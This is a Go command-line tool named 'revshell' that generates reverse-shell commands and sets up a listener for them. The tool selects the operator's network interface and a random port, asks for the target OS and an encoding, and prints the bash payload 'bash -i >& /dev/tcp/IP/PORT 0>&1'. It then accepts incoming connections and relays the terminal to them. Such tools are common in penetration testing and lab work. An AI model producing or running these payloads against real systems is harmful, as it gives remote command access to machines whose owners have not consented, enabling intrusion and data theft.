/*
Copyright © 2026 hi@maxfrancis.me
*/
package cmd

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"

	"math/rand/v2"

	"charm.land/huh/v2"
	"github.com/spf13/cobra"
)

type tunnelAddress struct {
	label string
	ip    string
}

type TargetOS string

const (
	TargetOsLinux   TargetOS = "linux"
	TargetOsWindows TargetOS = "windows"
	TargetOsMacOS   TargetOS = "macos"
	TargetUnknown   TargetOS = "unknown"
)

var targetOSValues = []TargetOS{
	TargetOsLinux,
	TargetOsWindows,
	TargetOsMacOS,
	TargetUnknown,
}

func targetOSLabel(targetOS TargetOS) string {
	switch targetOS {
	case TargetOsLinux:
		return "Linux"
	case TargetOsWindows:
		return "Windows"
	case TargetOsMacOS:
		return "macOS"
	case TargetUnknown:
		return "I don't know"
	default:
		return string(targetOS)
	}
}

type Encoding string

const (
	EncodingBase64           Encoding = "base64"
	EncodingNone             Encoding = "none"
	EncodingUrl              Encoding = "url"
	EncodingPowerShellBase64 Encoding = "powershell-base64"
)

var encodingValues = []Encoding{
	EncodingBase64,
	EncodingNone,
	EncodingUrl,
	EncodingPowerShellBase64,
}

func targetEncodingLabels(encoding Encoding) string {
	switch encoding {
	case EncodingBase64:
		return "Base64 encoding"
	case EncodingNone:
		return "No encoding"
	case EncodingUrl:
		return "URL encoding"
	case EncodingPowerShellBase64:
		return "Powershell Base64 encoding"
	default:
		return string(encoding)
	}
}

type ShellCandidate struct {
	Name     string
	OS       TargetOS
	Encoding Encoding
	Template string
}

func selectTunnelAddress() (string, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "", fmt.Errorf("list network interfaces: %w", err)
	}

	var addresses []tunnelAddress

	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp == 0 {
			continue
		}

		ifaceAddresses, err := iface.Addrs()
		if err != nil {
			return "", fmt.Errorf(
				"get addresses for interface %s: %w",
				iface.Name,
				err,
			)
		}

		for _, address := range ifaceAddresses {
			ip := addressIP(address)
			if ip == nil || ip.IsLoopback() {
				continue
			}

			if ip.To4() == nil {
				continue
			}

			addresses = append(addresses, tunnelAddress{
				label: fmt.Sprintf("%s (%s)", iface.Name, ip.String()),
				ip:    ip.String(),
			})
		}
	}

	if len(addresses) == 0 {
		return "", fmt.Errorf("no active tunnel interfaces with IPv4 addresses found")
	}

	sort.Slice(addresses, func(i, j int) bool {
		return addresses[i].label < addresses[j].label
	})

	options := make([]huh.Option[string], 0, len(addresses))
	for _, address := range addresses {
		options = append(
			options,
			huh.NewOption(address.label, address.ip),
		)
	}

	var selectedIP string

	err = huh.NewSelect[string]().
		Title("Select a tunnel interface").
		Options(options...).
		Value(&selectedIP).
		Run()
	if err != nil {
		return "", fmt.Errorf("select tunnel interface: %w", err)
	}

	return selectedIP, nil
}

func selectTunnelPort() (string, error) {
	selectedPort := rand.IntN(999) + 9000
	listener, err := net.Listen("tcp", ":"+strconv.Itoa(selectedPort))
	if err != nil {
		return "", fmt.Errorf("Port unavailable:", err)
	}
	defer listener.Close()

	return strconv.Itoa(selectedPort), nil
}

func addressIP(address net.Addr) net.IP {
	switch value := address.(type) {
	case *net.IPNet:
		return value.IP
	case *net.IPAddr:
		return value.IP
	default:
		return nil
	}
}

func isTunnelInterface(name string) bool {
	name = strings.ToLower(name)

	prefixes := []string{
		"tun",
		"tap",
		"wg",
		"utun",
		"ppp",
		"ipsec",
		"tailscale",
		"zt",
	}

	for _, prefix := range prefixes {
		if strings.HasPrefix(name, prefix) {
			return true
		}
	}

	return false
}

func queryReverseShellCommandsToOffer() (ShellCandidate, error) {
	options := make(
		[]huh.Option[TargetOS],
		0,
		len(targetOSValues),
	)
	options2 := make(
		[]huh.Option[Encoding],
		0,
		len(encodingValues),
	)

	for _, targetOS := range targetOSValues {
		options = append(
			options,
			huh.NewOption(
				targetOSLabel(targetOS),
				targetOS,
			),
		)
	}

	for _, encoding := range encodingValues {
		options2 = append(
			options2,
			huh.NewOption(
				targetEncodingLabels(encoding),
				encoding,
			),
		)
	}

	var selectedOS TargetOS
	var selectedEncoding Encoding

	err := huh.NewSelect[TargetOS]().
		Title("What OS is the target running?").
		Options(options...).
		Value(&selectedOS).
		Run()
	if err != nil {
		fmt.Printf(
			"select target OS: %w",
			options,
		)
	}

	err2 := huh.NewSelect[Encoding]().
		Title("What encoding do you require?").
		Options(options2...).
		Value(&selectedEncoding).
		Run()
	if err2 != nil {
		fmt.Printf(
			"select target OS: %w",
			options2,
		)
	}

	candidate := ShellCandidate{
		Name:     "ReverseBash",
		OS:       selectedOS, // Replace with your actual TargetS value/enum
		Encoding: selectedEncoding,
		Template: "bash -i >& /dev/tcp/{{.IP}}/{{.Port}} 0>&1",
	}
	return candidate, nil
}

// rootCmd represents the base command when called without any subcommands
var rootCmd = &cobra.Command{
	Use:   "revshell",
	Short: "Stupidly easy reverse shell generator and listener setup",
	Args:  cobra.NoArgs,

	RunE: func(cmd *cobra.Command, args []string) error {
		selectedIP, err := selectTunnelAddress()
		if err != nil {
			return fmt.Errorf("select tunnel address: %w", err)
		}

		fmt.Fprintf(
			cmd.OutOrStdout(),
			"Selected tunnel address: %s\n",
			selectedIP,
		)

		selectedPort, err := selectTunnelPort()
		fmt.Fprintf(
			cmd.OutOrStdout(),
			"Selected port: %s\n",
			selectedPort,
		)

		shellCandidate, err := queryReverseShellCommandsToOffer()
		fmt.Println(shellCandidate)

		establishReverseShellListener(selectedPort)

		return nil
	},
}

func establishReverseShellListener(port string) error {
	listener, err := net.Listen("tcp", ":"+port)
	if err != nil {
		return fmt.Errorf("listen on port %s: %w", port, err)
	}
	defer listener.Close()

	fmt.Printf("\nSetting up port listener on...\n", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println(err)
			continue
		}

		// Handle each connection in a separate routine
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	// Copy data from the connection to standard output,
	// and from standard input to the connection
	go io.Copy(os.Stdout, conn)
	io.Copy(conn, os.Stdin)
}

// Execute adds all child commands to the root command and sets flags appropriately.
// This is called by main.main(). It only needs to happen once to the rootCmd.
func Execute() {
	err := rootCmd.Execute()
	if err != nil {
		os.Exit(1)
	}
}

func init() {
	// Here you will define your flags and configuration settings.
	// Cobra supports persistent flags, which, if defined here,
	// will be global for your application.

	// rootCmd.PersistentFlags().StringVar(&cfgFile, "config", "", "config file (default is $HOME/.revshell.yaml)")

	// Cobra also supports local flags, which will only run
	// when this action is called directly.
	rootCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
}
